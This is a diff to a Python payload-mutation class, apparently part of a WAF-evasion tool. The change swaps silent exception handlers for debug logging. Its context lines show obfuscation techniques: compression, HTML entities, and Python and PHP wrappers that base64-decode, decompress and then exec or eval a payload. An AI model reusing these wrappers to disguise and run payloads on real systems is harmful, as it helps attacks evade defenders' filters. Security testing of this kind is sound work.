@@ -10,6 +10,7 @@ Techniques:
 - Whitespace Substitution
 - HTML Entity Encoding
 """
+import logging
 import urllib.parse
 import random
 import zlib
@@ -17,6 +18,8 @@ import bz2
 import base64
 import binascii
 import html
+
+_logger = logging.getLogger(__name__)
 
 class Mutator:
     @staticmethod
@@ -38,9 +41,11 @@ class Mutator:
 
         # 2. Compression Variants (Hex stream)
         try: variants.add(zlib.compress(b_payload).hex())
-        except Exception: pass
+        except Exception as exc:
+            _logger.debug("[mutator] Suppressed exception: %r", exc)
         try: variants.add(bz2.compress(b_payload).hex())
-        except Exception: pass
+        except Exception as exc:
+            _logger.debug("[mutator] Suppressed exception: %r", exc)
         
         # 3. HTML Entity Polishing
         # & -> &amp; (WAF sees distinct string, Backend decodes)
@@ -287,7 +292,8 @@ class Mutator:
             variants.add(f"python3 -c \"import zlib,base64;exec(zlib.decompress(base64.b64decode('{compressed}')))\"")
             # Python 2 wrapper
             variants.add(f"python -c \"import zlib,base64;exec(zlib.decompress(base64.b64decode('{compressed}')))\"")
-        except Exception: pass
+        except Exception as exc:
+            _logger.debug("[mutator] Suppressed exception: %r", exc)
         
         # 3. PHP Base64 Wrapper
         variants.add(f"eval(base64_decode('{b64}'));")
